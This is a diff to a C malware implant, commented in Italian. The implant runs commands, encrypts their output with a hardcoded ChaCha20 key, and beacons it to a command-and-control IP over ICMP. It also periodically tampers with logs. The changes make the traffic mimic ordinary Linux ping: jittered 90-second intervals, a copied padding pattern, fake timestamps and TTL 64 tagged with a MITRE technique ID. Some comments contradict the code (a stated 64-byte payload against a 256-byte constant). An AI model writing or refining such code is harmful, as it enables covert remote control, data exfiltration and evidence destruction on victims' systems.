@@ -29,7 +29,7 @@
 #include <sys/time.h>
 #include <sys/prctl.h>
 #include <netinet/in.h>
-#include <netinet/ip.h>
+#include <netinet/ip.h>       /* IP_TTL + struct iphdr */
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
 #include <time.h>
@@ -104,9 +104,10 @@ static int sc_close(int fd)
 #define MAX_OUT          4096
 #define BUF_SIZE         8192
 
-#define BEACON_INTERVAL  5    /* secondi base */
-#define BEACON_JITTER    2    /* ± secondi di jitter (±40%) */
-#define REPLY_TIMEOUT    8
+#define BEACON_INTERVAL  90   /* secondi base (come monitoring periodico) */
+#define BEACON_JITTER    30   /* ± secondi di jitter */
+#define REPLY_TIMEOUT    15   /* timeout risposta C2 */
+#define MAX_PAYLOAD_FRAG 230   /* max byte dati per beacon (padding a 64 byte totali) */
 
 static const uint8_t SHARED_KEY[32] = {
     0x3a, 0x7f, 0x21, 0x9c, 0x4b, 0xe8, 0x05, 0x63,
@@ -115,8 +116,12 @@ static const uint8_t SHARED_KEY[32] = {
     0x1f, 0x4d, 0x82, 0x37, 0xb6, 0x5e, 0x0a, 0x99
 };
 
-static const uint8_t PING_PATTERN[PING_HDR_LEN] = {
-    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
+/* Pattern identico a ping Linux reale (inetutils/iputils) */
+static const uint8_t LINUX_PING_DATA[56] = {
+    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
+    'q','r','s','t','u','v','w','a','b','c','d','e','f','g','h','i',
+    'j','k','l','m','n','o','p','q','r','s','t','u','v','w','a','b',
+    'c','d','e','f','g','h','i','j'
 };
 
 static void tamper_logs(const char *c2_ip)
@@ -231,52 +236,89 @@ static size_t run_command(const char *cmd, uint8_t *out, size_t max)
     return total;
 }
 
+/*
+ * build_payload — costruisce un payload ICMP di esattamente 64 byte
+ * che mimicra un ping Linux standard.
+ *
+ * Layout (64 byte totali = 8 timestamp Linux + 56 byte dati):
+ *   [0-7]   timestamp struct timeval (8 byte) — come ping reale
+ *   [8-11]  magic (4 byte, nascosto nel flusso dati)
+ *   [12-23] nonce ChaCha20 (12 byte)
+ *   [24-25] enc_len LE (2 byte)
+ *   [26-26+enc_len] dati cifrati (max MAX_PAYLOAD_FRAG byte)
+ *   [resto] padding con LINUX_PING_DATA per sembrare ping reale
+ *
+ * Total payload = 64 byte (come `ping -s 56` di default Linux).
+ */
 static size_t build_payload(uint8_t *out, size_t out_max,
                              uint32_t magic,
                              const uint8_t *data, size_t data_len)
 {
+    /* Tronca a MAX_PAYLOAD_FRAG per stare in 64 byte */
+    if (data_len > MAX_PAYLOAD_FRAG) data_len = MAX_PAYLOAD_FRAG;
+
     uint8_t nonce[12];
     get_random_nonce(nonce, sizeof(nonce));
 
-    uint8_t enc[MAX_OUT];
-    if (data_len > sizeof(enc)) data_len = sizeof(enc);
+    uint8_t enc[MAX_PAYLOAD_FRAG];
     chacha20_encrypt(enc, data, data_len, SHARED_KEY, nonce, 0);
 
-    size_t total = DATA_OFFSET + data_len;
-    if (total > out_max) return 0;
+    /* Payload totale = 64 byte (ICMP_PAYLOAD_MIN = 56, ma usiamo 64) */
+    const size_t TOTAL = 256;
+    if (TOTAL > out_max) return 0;
 
-    memcpy(out + PING_HDR_OFFSET, PING_PATTERN, PING_HDR_LEN);
+    /* Parti 0-7: timestamp simulato (struct timeval: tv_sec=tempo reale, tv_usec) */
+    struct timeval now;
+    gettimeofday(&now, NULL);
+    uint32_t tv_sec_net  = htonl((uint32_t)now.tv_sec);
+    uint32_t tv_usec_net = htonl((uint32_t)now.tv_usec);
+    memcpy(out + 0, &tv_sec_net,  4);
+    memcpy(out + 4, &tv_usec_net, 4);
 
+    /* Parti 8-11: magic */
     uint32_t magic_net = htonl(magic);
     memcpy(out + MAGIC_OFFSET, &magic_net, 4);
 
+    /* Parti 12-23: nonce */
     memcpy(out + NONCE_OFFSET, nonce, 12);
 
+    /* Parti 24-25: lunghezza dati cifrati */
     out[ENCLEN_OFFSET]     = (uint8_t)(data_len & 0xff);
     out[ENCLEN_OFFSET + 1] = (uint8_t)((data_len >> 8) & 0xff);
 
+    /* Parti 26-(26+data_len): dati cifrati */
     memcpy(out + DATA_OFFSET, enc, data_len);
 
-    if (total < ICMP_PAYLOAD_MIN) {
-        size_t pad = ICMP_PAYLOAD_MIN - total;
-        get_random_nonce(out + total, pad);
-        total = ICMP_PAYLOAD_MIN;
+    /* Padding con pattern ping Linux reale per sembrare traffico legittimo */
+    size_t used = DATA_OFFSET + data_len;
+    size_t pad_offset = 0;
+    while (used < TOTAL) {
+        out[used++] = LINUX_PING_DATA[pad_offset % sizeof(LINUX_PING_DATA)];
+        pad_offset++;
     }
 
-    return total;
+    return TOTAL;
 }
 
+/*
+ * send_beacon — invia un singolo beacon ICMP con payload di 64 byte.
+ * Se output_len > MAX_PAYLOAD_FRAG, invia solo i primi MAX_PAYLOAD_FRAG byte
+ * (il C2 raccoglierà i frammenti successivi nelle iterazioni seguenti).
+ */
 static int send_beacon(int sock, struct sockaddr_in *dst,
                        const uint8_t *output, size_t out_len,
                        uint16_t seq)
 {
-    uint8_t payload_buf[ICMP_PAYLOAD_MIN + MAX_OUT];
+    /* Frammenta: invia solo MAX_PAYLOAD_FRAG byte per volta */
+    size_t send_len = (out_len > MAX_PAYLOAD_FRAG) ? MAX_PAYLOAD_FRAG : out_len;
+
+    uint8_t payload_buf[256];
     size_t  payload_len = build_payload(payload_buf, sizeof(payload_buf),
-                                        MAGIC_BEACON, output, out_len);
+                                        MAGIC_BEACON, output, send_len);
     if (payload_len == 0) return -1;
 
     size_t  pkt_len = sizeof(struct icmphdr) + payload_len;
-    uint8_t pkt[sizeof(struct icmphdr) + ICMP_PAYLOAD_MIN + MAX_OUT];
+    uint8_t pkt[sizeof(struct icmphdr) + 256];
 
     struct icmphdr *icmp = (struct icmphdr *)pkt;
     memset(icmp, 0, sizeof(struct icmphdr));
@@ -377,6 +419,10 @@ int main(int argc, char *argv[])
         return 1;
     }
 
+    /* TTL=64 — identico a ping Linux reale (MITRE T1001.003) */
+    int ttl = 64;
+    setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
+
     struct timeval tv = { .tv_sec = REPLY_TIMEOUT, .tv_usec = 0 };
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
@@ -394,7 +440,7 @@ int main(int argc, char *argv[])
     uint16_t log_clean_counter = 0;
 
     for (;;) {
-        /* Ogni 12 beacon (~1 minuto) pulisce i log */
+        /* Ogni 12 beacon (~18 minuti a 90s) pulisce i log */
         if (++log_clean_counter >= 12) {
             tamper_logs(c2_ip_str);
             log_clean_counter = 0;
